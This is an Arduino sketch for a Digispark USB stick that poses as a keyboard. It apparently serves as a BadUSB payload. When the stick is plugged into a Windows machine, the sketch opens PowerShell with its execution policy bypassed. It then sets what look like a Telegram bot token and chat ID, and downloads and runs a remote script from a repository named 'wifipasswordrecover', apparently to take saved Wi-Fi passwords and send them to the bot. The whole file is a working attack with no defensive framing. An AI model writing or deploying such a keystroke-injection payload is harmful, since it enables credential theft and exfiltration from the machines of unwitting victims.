#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -ep bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  DigiKeyboard.print("$env:TK='8464883369:AAH8am3Lj8inaWk2nFbqC5BC4CsGIZnkJZw'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print("$env:CI='5122031226'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/mrbob101signal-bit/wifipasswordrecover/main/scripts/void.ps1' -UseBasicParsing).Content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(15000);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
